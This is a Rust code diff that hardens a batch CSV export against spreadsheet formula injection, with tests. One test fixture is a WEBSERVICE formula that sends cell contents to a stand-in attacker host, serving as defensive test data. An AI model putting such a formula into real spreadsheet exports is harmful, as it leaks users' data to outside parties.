@@ -926,8 +926,15 @@ fn is_terminal_task_status(status: &str) -> bool {
 }
 
 fn csv_field(value: &str) -> String {
-    if value.contains([',', '"', '\n', '\r']) {
-        format!("\"{}\"", value.replace('"', "\"\""))
+    // CSV quoting alone does not prevent formulas. Mark dangerous cells as text
+    // before escaping, including prefixes a spreadsheet may trim or normalize.
+    let start =
+        value.trim_start_matches(|c: char| c.is_whitespace() || c.is_control() || c == '\u{feff}');
+    let as_text = value.starts_with(['\t', '\r', '\n'])
+        || start.starts_with(['=', '+', '-', '@', '＝', '＋', '－', '＠']);
+    if as_text || value.contains([',', '"', '\n', '\r']) {
+        let prefix = if as_text { "'" } else { "" };
+        format!("\"{prefix}{}\"", value.replace('"', "\"\""))
     } else {
         value.to_string()
     }
@@ -1829,6 +1836,84 @@ mod tests {
                 "{BATCH_RESULT_HEADER}\n1,sweep-0001,COMPLETED,3,42,,\"{{\"\"values\"\":[1,2]}}\"\n"
             )
         );
+    }
+
+    #[test]
+    fn batch_csv_neutralizes_spreadsheet_formulas_and_leading_controls() {
+        for value in [
+            "=1+1",
+            "+SUM(1,2)",
+            "-1+2",
+            "@SUM(A1:A2)",
+            "\ttext",
+            "\rtext",
+            "\ntext",
+            " \t\r\n=1+1",
+            "\u{feff}=1+1",
+            "\u{2003}+1",
+            "\0@SUM(A1:A2)",
+            "＝1+1",
+            "＋1",
+            "－1",
+            "＠SUM(A1:A2)",
+        ] {
+            assert_eq!(
+                csv_field(value),
+                format!("\"'{}\"", value.replace('"', "\"\"")),
+                "{value:?}"
+            );
+        }
+        for value in [
+            "",
+            "plain",
+            " leading space",
+            "12",
+            "value=1",
+            "'already text",
+        ] {
+            assert_eq!(csv_field(value), value);
+        }
+    }
+
+    #[test]
+    fn batch_csv_neutralizes_task_outputs_and_messages_without_changing_results() {
+        let formula = "=WEBSERVICE(\"https://attacker.invalid/collect?data=\"&ENCODEURL(G3))";
+        let mut rows = vec![
+            BatchRow {
+                index: 1,
+                task_id: "batch-0001".into(),
+                input: "{}".into(),
+                status: "PENDING".into(),
+                output: String::new(),
+                billed_cpt: None,
+                message: String::new(),
+            },
+            BatchRow {
+                index: 2,
+                task_id: "batch-0002".into(),
+                input: "{\"private\":\"value\"}".into(),
+                status: "COMPLETED".into(),
+                output: "ordinary result".into(),
+                billed_cpt: Some(1),
+                message: String::new(),
+            },
+        ];
+        let snapshots = std::collections::HashMap::from([(
+            "batch-0001".into(),
+            serde_json::json!({
+                "task_id": "batch-0001", "status": "COMPLETED", "output": formula,
+                "billed_amount": 1, "status_message": "+1+1",
+            }),
+        )]);
+        apply_batch_snapshots(&mut rows, &snapshots);
+        assert_eq!(render_batch_csv(&rows), format!(
+            "{BATCH_RESULT_HEADER}\n1,batch-0001,COMPLETED,\"'=WEBSERVICE(\"\"https://attacker.invalid/collect?data=\"\"&ENCODEURL(G3))\",1,\"'+1+1\",{{}}\n2,batch-0002,COMPLETED,ordinary result,1,,\"{{\"\"private\"\":\"\"value\"\"}}\"\n"
+        ));
+        assert_eq!(
+            rows[0].output, formula,
+            "only the CSV representation changes"
+        );
+        assert_eq!(rows[0].message, "+1+1");
     }
 
     #[test]
